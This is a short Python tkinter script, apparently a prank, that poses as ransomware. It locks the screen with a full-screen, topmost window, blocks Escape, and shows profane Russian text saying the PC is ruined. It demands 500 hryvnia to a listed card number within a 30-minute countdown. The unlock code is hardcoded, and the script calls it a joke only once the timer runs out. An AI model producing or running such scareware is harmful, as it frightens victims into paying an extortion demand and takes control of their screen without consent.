import tkinter as tk
from tkinter import messagebox
import time
import threading

PASSWORD = "228000"
TIMER_MINUTES = 30
unlocked = False

def check_password():
    global unlocked
    if entry.get() == PASSWORD:
        unlocked = True
        root.destroy()
    else:
        entry.delete(0, tk.END)
        error_label.config(text="❌ Неверный пароль!")
        root.after(2000, lambda: error_label.config(text=""))

def update_timer():
    start = time.time()
    while not unlocked:
        remaining = TIMER_MINUTES * 60 - (time.time() - start)
        if remaining <= 0:
            root.after(0, lambda: messagebox.showinfo("Время вышло", "Время вышло, но это шутка. Пароль 228000"))
            root.after(0, root.destroy)
            break
        mins = int(remaining // 60)
        secs = int(remaining % 60)
        timer_label.config(text=f"⏰ {mins:02d}:{secs:02d}")
        time.sleep(1)

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.configure(bg="black")
root.bind("<Escape>", lambda e: None)

frame = tk.Frame(root, bg="black")
frame.pack(expand=True)

tk.Label(frame, text="👑 ОТ ПОВЕЛИТЕЛЯ ВИЗИКА 👑", font=("Arial", 24, "bold"), fg="purple", bg="black").pack(pady=10)
tk.Label(frame, text="⚠️ ТВОЕМУ ПК ПИЗДА ⚠️", font=("Arial", 36, "bold"), fg="red", bg="black").pack(pady=10)
tk.Label(frame, text="Кидай 500 грн на карту 0678949003", font=("Arial", 24), fg="white", bg="black").pack()
tk.Label(frame, text="в течение 30 минут", font=("Arial", 20), fg="white", bg="black").pack(pady=10)

timer_label = tk.Label(frame, text=f"⏰ {TIMER_MINUTES:02d}:00", font=("Arial", 40, "bold"), fg="cyan", bg="black")
timer_label.pack(pady=20)

tk.Label(frame, text="Код разблокировки:", font=("Arial", 18), fg="white", bg="black").pack(pady=(30, 5))
entry = tk.Entry(frame, font=("Arial", 22), bg="white", fg="black", justify="center", width=10)
entry.pack(pady=5)
entry.focus_set()
entry.bind("<Return>", lambda e: check_password())

tk.Button(frame, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 16, "bold"), bg="red", fg="white", command=check_password).pack(pady=10)

error_label = tk.Label(frame, text="", font=("Arial", 14), fg="orange", bg="black")
error_label.pack()

threading.Thread(target=update_timer, daemon=True).start()
root.mainloop()